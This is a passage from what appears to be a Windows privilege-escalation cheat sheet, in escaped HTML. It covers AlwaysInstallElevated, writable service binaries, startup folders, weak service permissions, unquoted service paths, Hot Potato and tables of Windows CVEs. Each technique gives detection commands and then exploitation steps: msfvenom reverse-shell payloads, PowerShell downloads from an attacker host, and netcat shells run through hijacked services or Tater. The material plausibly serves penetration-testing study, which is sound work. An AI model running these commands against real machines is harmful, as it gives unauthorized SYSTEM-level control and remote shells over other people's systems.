id=\"alwaysinstallelevated\"\u003EAlwaysInstallElevated\u003C\u002Fh4\u003E\n\u003Ch5 id=\"detection-1\"\u003EDetection\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Epowershell -exec bypass -command \"&amp; { Import-Module .\\PowerUp.ps1; Invoke-AllChecks; }\"\n\n[*] Checking for AlwaysInstallElevated registry key...\n\nAbuseFunction : Write-UserAddMSI\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003Eor\u003C\u002Fp\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ereg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\nreg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\n\nIf both values are equal to 1 then it's vulnerable.\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003Eor\u003C\u002Fp\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EwinPEAS.exe\n\n[+] Checking AlwaysInstallElevated(T1012)\n\n  AlwaysInstallElevated set to 1 in HKLM!\n  AlwaysInstallElevated set to 1 in HKCU!\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch5 id=\"exploitation-1\"\u003EExploitation\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Attacker\nmsfvenom -p windows\u002Fshell_reverse_tcp LHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f msi \u003E program.msi\nsudo python -m SimpleHTTPServer 80\nsudo nc -lvp \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# Victim\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002Fprogram.msi', 'C:\\Temp\\program.msi')\nmsiexec \u002Fquiet \u002Fqn \u002Fi C:\\Temp\\program.msi\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"executable-files\"\u003EExecutable Files\u003C\u002Fh4\u003E\n\u003Ch5 id=\"detection-2\"\u003EDetection\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Epowershell -exec bypass -command \"&amp; { Import-Module .\\PowerUp.ps1; Invoke-AllChecks; }\"\n\n[*] Checking service executable and argument permissions...\n\nServiceName                     : filepermsvc\nPath                            : \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\"\nModifiableFile                  : C:\\Program Files\\File Permissions Service\\filepermservice.exe\nModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute\u002FTraverse, DeleteChild...}\nModifiableFileIdentityReference : Everyone\nStartName                       : LocalSystem\nAbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'\nCanRestart                      : True\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003Eor\u003C\u002Fp\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EwinPEAS.exe\n\n[+] Interesting Services -non Microsoft-(T1007)\n\nfilepermsvc(Apache Software Foundation - File Permissions Service)[\"C:\\Program Files\\File Permissions Service\\filepermservice.exe\"] - Manual - Stopped\n    File Permissions: Everyone [AllAccess]\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch5 id=\"exploitation-2\"\u003EExploitation\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Attacker\nmsfvenom -p windows\u002Fshell_reverse_tcp LHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f exe \u003E program.exe\nsudo python -m SimpleHTTPServer 80\nsudo nc -lvp \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# Victim\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002Fprogram.exe', 'C:\\Temp\\program.exe')\ncopy \u002Fy c:\\Temp\\program.exe \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\"\nsc start filepermsvc\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"startup-applications\"\u003EStartup applications\u003C\u002Fh4\u003E\n\u003Ch5 id=\"detection-3\"\u003EDetection\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Eicacls.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n\nC:\\\u003Eicacls.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup BUILTIN\\Users:(F)\n                                                             TCM-PC\\TCM:(I)(OI)(CI)(DE,DC)\n                                                             NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F)\n                                                             BUILTIN\\Administrators:(I)(OI)(CI)(F)\n                                                             BUILTIN\\Users:(I)(OI)(CI)(RX)\n                                                             Everyone:(I)(OI)(CI)(RX)\n\nIf the user you're connecte with has full access (F) to the directory (here Users) then it's vulnerable.\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch5 id=\"exploitation-3\"\u003EExploitation\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Attacker\nmsfvenom -p windows\u002Fshell_reverse_tcp LHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f exe \u003E program.exe\nsudo python -m SimpleHTTPServer 80\nsudo nc -lvp \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# Victim\ncd \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002Fprogram.exe', '.\\program.exe')\n\nTo execute it with elevated privileges we need to wait for someone in the Admin group to login.\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"weak-service-permission\"\u003EWeak service permission\u003C\u002Fh4\u003E\n\u003Ch5 id=\"detection-4\"\u003EDetection\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Find all services authenticated users have modify access onto\naccesschk.exe \u002Faccepteula -uwcqv \"Authenticated Users\" *\n\nif SERVICE_ALL_ACCESS then vulnerable\n\n# Find all weak folder permissions per drive.\naccesschk.exe \u002Faccepteula -uwdqs Users c:\\\naccesschk.exe \u002Faccepteula -uwdqs \"Authenticated Users\" c:\\\n\n# Find all weak file permissions per drive.\naccesschk.exe \u002Faccepteula -uwqs Users c:\\*.*\naccesschk.exe \u002Faccepteula -uwqs \"Authenticated Users\" c:\\*.*\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003Eor\u003C\u002Fp\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Epowershell -exec bypass -command \"&amp; { Import-Module .\\PowerUp.ps1; Invoke-AllChecks; }\"\n\n[*] Checking service permissions...\n\nServiceName   : daclsvc\nPath          : \"C:\\Program Files\\DACL Service\\daclservice.exe\"\nStartName     : LocalSystem\nAbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'\nCanRestart    : True\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003Eor\u003C\u002Fp\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EwinPEAS.exe\n\n[+] Interesting Services -non Microsoft-(T1007)\n\ndaclsvc(DACL Service)[\"C:\\Program Files\\DACL Service\\daclservice.exe\"] - Manual - Stopped\n    YOU CAN MODIFY THIS SERVICE: WriteData\u002FCreateFiles\n\n[+] Modifiable Services(T1007)\n    LOOKS LIKE YOU CAN MODIFY SOME SERVICE\u002Fs:\n    daclsvc: WriteData\u002FCreateFiles\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch5 id=\"exploitation-4\"\u003EExploitation\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Attacker\nsudo python -m SimpleHTTPServer 80\nsudo nc -lvp \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# Victim\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002Fnc.exe', '.\\nc.exe')\nsc config \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESERVICENAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E binpath= \"\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPATH\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\\nc.exe \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -e cmd.exe\"\nsc start \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESERVICENAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nor \nnet start \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESERVICENAME\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"unquoted-service-paths\"\u003EUnquoted service paths\u003C\u002Fh4\u003E\n\u003Ch5 id=\"detection-5\"\u003EDetection\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Epowershell -exec bypass -command \"&amp; { Import-Module .\\PowerUp.ps1; Invoke-AllChecks; }\"\n\n[*] Checking for unquoted service paths...\n\nServiceName    : unquotedsvc\nPath           : C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe\nModifiablePath : @{Permissions=AppendData\u002FAddSubdirectory; ModifiablePath=C:\\;IdentityReference=NT AUTHORITY\\Authenticated Users}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EHijackPath\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nCanRestart     : True\n\nServiceName    : unquotedsvc\nPath           : C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe\nModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\\; IdentityReference=NT AUTHORITY\\Authenticated Users}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EHijackPath\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nCanRestart     : True\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003Eor\u003C\u002Fp\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EwinPEAS.exe\n\n[+] Interesting Services -non Microsoft-(T1007)\n\nunquotedsvc(Unquoted Path Service)[C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch5 id=\"exploitation-5\"\u003EExploitation\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Attacker\nmsfvenom -p windows\u002Fshell_reverse_tcp LHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -f exe \u003E Common.exe\nsudo python -m SimpleHTTPServer 80\nsudo nc -lvp \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# Victim\ncd \"C:\\Program Files\\Unquoted Path Service\\\"\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002FCommon.exe', '.\\Common.exe')\nsc start unquotedsvc\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"hot-potato\"\u003EHot potato\u003C\u002Fh4\u003E\n\u003Ch5 id=\"exploitation-6\"\u003EExploitation\u003C\u002Fh5\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Attacker\nsudo python -m SimpleHTTPServer 80\nsudo nc -lvp \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# Victim\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002Fnc.exe', '.\\nc.exe')\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002FTater.ps1.exe', '.\\Tater.ps1.exe')\npowershell -exec bypass -command \"&amp; { Import-Module .\\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\\nc.exe \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -e cmd.exe' }\"\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"cve\"\u003ECVE\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Already compiled exploit\nhttps:\u002F\u002Fgithub.com\u002FSecWiki\u002Fwindows-kernel-exploits\nhttps:\u002F\u002Fgithub.com\u002Fabatchy17\u002FWindowsExploits\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch5 id=\"windows-xp\"\u003EWindows XP\u003C\u002Fh5\u003E\n\u003Ctable\u003E\n\u003Cthead\u003E\n\u003Ctr\u003E\n\u003Cth align=\"center\"\u003ECVE\u003C\u002Fth\u003E\n\u003Cth align=\"left\"\u003EDescription\u003C\u002Fth\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Fthead\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2002-1214\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Ems02_063_pptp_dos - exploits a kernel based overflow when sending abnormal PPTP Control Data packets - code execution, DoS\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2003-0352\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Ems03_026_dcom - exploits a stack buffer overflow in the RPCSS service\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2003-0533\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EMS04-011 - ms04_011_lsass - exploits a stack buffer overflow in the LSASS service\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2003-0719\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Ems04_011_pct - exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack - Private communication target overflow\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2003-0812\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Ems03_049_netapi - exploits a stack buffer overflow in the NetApi32\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2003-0818\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Ems04_007_killbill -  vulnerability in the bit string decoding code in the Microsoft ASN.1 library\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2003-0822\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Ems03_051_fp30reg_chunked - exploit for the chunked encoding buffer overflow described in MS03-051\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2004-0206\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Ems04_031_netdde - exploits a stack buffer overflow in the NetDDE service\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2010-3138\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EEXPLOIT-DB 14765 - Untrusted search path vulnerability - allows local users to gain privileges via a Trojan horse\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2010-3147\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EEXPLOIT-DB 14745 - Untrusted search path vulnerability in wab.exe - allows local users to gain privileges via a Trojan horse\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2010-3970\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Ems11_006_createsizeddibsection - exploits a stack-based buffer overflow in thumbnails within .MIC files - code execution\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2011-1345\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EInternet Explorer does not properly handle objects in memory - allows remote execution of code via object\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2011-5046\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EEXPLOIT-DB 18275 - GDI in windows does not properly validate user-mode input - allows remote code execution\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2012-4349\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EUnquoted windows search path - Windows provides the capability of including spaces in path names - can be root\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\u003C\u002Ftable\u003E\n\u003Ch5 id=\"windows-7\"\u003EWindows 7\u003C\u002Fh5\u003E\n\u003Ctable\u003E\n\u003Cthead\u003E\n\u003Ctr\u003E\n\u003Cth align=\"center\"\u003ECVE\u003C\u002Fth\u003E\n\u003Cth align=\"left\"\u003EDescription\u003C\u002Fth\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Fthead\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2010-0232\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Ems10_015_kitrap0d - create a new session with SYSTEM privileges via the KiTrap0D exploit\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2010-2568\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Ems10_046_shortcut_icon_dllloader - exploits a vulnerability in the handling of Windows Shortcut files (.LNK) - run a payload\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2010-2744\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EEXPLOIT-DB 15894 - kernel-mode drivers in windows do not properly manage a window class - allows privileges escalation\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2010-3227\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EEXPLOIT-DB - Stack-based buffer overflow in the UpdateFrameTitleForDocument method - arbitrary code execution\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2014-4113\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Ems14_058_track_popup_menu - exploits a NULL Pointer Dereference in win32k.sys - arbitrary code execution\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2014-4114\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Ems14_060_sandworm - exploits a vulnerability found in Windows Object Linking and Embedding - arbitrary code execution\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2015-0016\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Ems15_004_tswbproxy -  abuses a process creation policy in Internet Explorer&#39;s sandbox - code execution\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2018-8494\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Eremote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user input\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\u003C\u002Ftable\u003E\n\u003Ch5 id=\"windows-8\"\u003EWindows 8\u003C\u002Fh5\u003E\n\u003Ctable\u003E\n\u003Cthead\u003E\n\u003Ctr\u003E\n\u003Cth align=\"center\"\u003ECVE\u003C\u002Fth\u003E\n\u003Cth\u003EDescription\u003C\u002Fth\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Fthead\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2013-0008\u003C\u002Ftd\u003E\n\u003Ctd\u003Ems13_005_hwnd_broadcast - attacker can broadcast commands from lower Integrity Level process to a higher one - privilege escalation\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2013-1300\u003C\u002Ftd\u003E\n\u003Ctd\u003Ems13_053_schlamperei - kernel pool overflow in Win32k - local privilege escalation\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"center\"\u003ECVE-2013-3660\u003C\u002Ftd\u003E\n\u003Ctd\u003Eppr_flatten_rec - exploits EPATHOBJ::pprFlattenRec due to the usage of uninitialized data - allows memory 